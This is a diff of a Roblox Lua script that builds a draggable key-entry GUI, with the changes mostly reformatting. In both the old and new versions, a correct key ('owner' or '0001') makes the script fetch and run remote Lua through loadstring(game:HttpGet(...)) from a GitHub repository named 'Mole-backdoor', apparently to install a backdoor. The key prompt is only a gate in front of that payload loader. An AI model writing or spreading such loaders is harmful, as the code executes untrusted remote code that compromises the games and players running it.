@@ -3,20 +3,21 @@ local UserInputService = game:GetService("UserInputService")
 
 local localPlayer = Players.LocalPlayer
 
-local whitelistedKeys = {
-	["owner"] = true,
-	["0001"] = true
+local whitelisted = {
+    ["owner"] = true,
+    ["0001"] = true,
 }
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "AccessKeyUI"
 gui.ResetOnSpawn = false
 
+-- Try CoreGui first, fallback to PlayerGui
 pcall(function()
-	gui.Parent = game:GetService("CoreGui")
+    gui.Parent = game:GetService("CoreGui")
 end)
 if not gui.Parent then
-	gui.Parent = localPlayer:WaitForChild("PlayerGui")
+    gui.Parent = localPlayer:WaitForChild("PlayerGui")
 end
 
 local frame = Instance.new("Frame")
@@ -76,55 +77,55 @@ submitBtn.Parent = frame
 Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 8)
 
 submitBtn.MouseEnter:Connect(function()
-	submitBtn.BackgroundColor3 = Color3.fromRGB(90, 190, 140)
+    submitBtn.BackgroundColor3 = Color3.fromRGB(90, 190, 140)
 end)
 submitBtn.MouseLeave:Connect(function()
-	submitBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 120)
+    submitBtn.BackgroundColor3 = Color3.fromRGB(70, 160, 120)
 end)
 
 submitBtn.MouseButton1Click:Connect(function()
-	local key = inputBox.Text
-	if whitelistedKeys[key] then
-		gui:Destroy()
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
-		end)
-		if not success then
-			warn("Failed to load Mole script:", err)
-		end
-	else
-		inputBox.Text = ""
-		inputBox.PlaceholderText = "Try again..."
-		feedback.Text = "Invalid key. Please try again."
-	end
+    local key = inputBox.Text
+    if whitelisted[key] then
+        gui:Destroy()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
+        end)
+        if not success then
+            warn("Failed to load script:", err)
+        end
+    else
+        inputBox.Text = ""
+        inputBox.PlaceholderText = "Invalid key, try again"
+        feedback.Text = "❌ Invalid key. Please try again."
+    end
 end)
 
--- Draggable UI
+-- Draggable Frame
 local dragging = false
 local dragInput, dragStart, startPos
 
 frame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 then
-		dragging = true
-		dragStart = input.Position
-		startPos = frame.Position
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
 
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
-		)
-	end
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
 end)
